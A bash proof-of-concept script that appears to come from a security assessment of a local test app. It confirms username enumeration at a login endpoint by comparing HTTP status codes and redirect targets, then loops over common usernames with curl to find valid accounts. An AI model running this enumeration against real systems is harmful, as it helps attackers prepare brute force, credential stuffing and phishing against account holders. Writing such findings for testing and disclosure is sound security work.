#!/bin/bash

# POC: Username Enumeration via Login Error Messages
# Target: http://localhost:8082/
# Vulnerability: Different HTTP status codes for valid vs invalid usernames

TARGET="http://localhost:8082/"

echo "=========================================="
echo "POC: Username Enumeration at Login Endpoint"
echo "=========================================="
echo ""

# Test Case 1: Invalid Username
echo "[*] Test 1: Submitting INVALID username 'admin'"
echo "Command: curl -s -o /dev/null -w 'HTTP Status: %{http_code}' -X POST $TARGET -d 'username=admin'"
RESPONSE_INVALID=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$TARGET" -d "username=admin")
echo "Result: HTTP $RESPONSE_INVALID"
echo ""

# Get the full response body for invalid username
echo "[*] Full response for invalid username:"
curl -s -X POST "$TARGET" -d "username=admin" | grep -E "(alert|User not found)" | head -3
echo ""

# Test Case 2: Valid Username
echo "[*] Test 2: Submitting VALID username 'test'"
echo "Command: curl -s -o /dev/null -w 'HTTP Status: %{http_code}' -X POST $TARGET -d 'username=test'"
RESPONSE_VALID=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$TARGET" -d "username=test")
echo "Result: HTTP $RESPONSE_VALID"
echo ""

# Check for redirect location
echo "[*] Checking redirect location for valid username:"
REDIRECT_LOCATION=$(curl -s -i -X POST "$TARGET" -d "username=test" | grep -i "^Location:" | tr -d '\r')
echo "$REDIRECT_LOCATION"
echo ""

# Test Case 3: Another Invalid Username
echo "[*] Test 3: Submitting INVALID username 'invaliduser123'"
RESPONSE_INVALID2=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$TARGET" -d "username=invaliduser123")
echo "Result: HTTP $RESPONSE_INVALID2"
echo ""

# Comparison Table
echo "=========================================="
echo "VULNERABILITY CONFIRMED:"
echo "=========================================="
echo ""
echo "Response Comparison:"
echo "--------------------"
echo "Username: admin"
echo "  Status: $RESPONSE_INVALID"
echo "  Indication: Invalid (User not found)"
echo ""
echo "Username: invaliduser123"
echo "  Status: $RESPONSE_INVALID2"
echo "  Indication: Invalid (User not found)"
echo ""
echo "Username: test"
echo "  Status: $RESPONSE_VALID"
echo "  Redirect: $REDIRECT_LOCATION"
echo "  Indication: Valid (Redirected to password page)"
echo ""

# Automated Enumeration Demo
echo "=========================================="
echo "AUTOMATED ENUMERATION DEMONSTRATION:"
echo "=========================================="
echo ""
echo "[*] Testing common usernames..."
echo ""

USERNAMES=("admin" "root" "user" "test" "trader" "john" "alice" "administrator")

VALID_USERS=()
INVALID_USERS=()

for username in "${USERNAMES[@]}"; do
    status=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$TARGET" -d "username=$username")
    if [ "$status" == "302" ]; then
        echo "[+] VALID: $username (HTTP $status - Redirected)"
        VALID_USERS+=("$username")
    else
        echo "[-] Invalid: $username (HTTP $status)"
        INVALID_USERS+=("$username")
    fi
done

echo ""
echo "=========================================="
echo "ENUMERATION RESULTS:"
echo "=========================================="
echo "Valid usernames found: ${#VALID_USERS[@]}"
for user in "${VALID_USERS[@]}"; do
    echo "  - $user"
done
echo ""
echo "Invalid usernames tested: ${#INVALID_USERS[@]}"
echo ""
echo "[!] IMPACT: An attacker can systematically discover valid usernames"
echo "[!] This enables targeted brute force, credential stuffing, and phishing attacks"
echo ""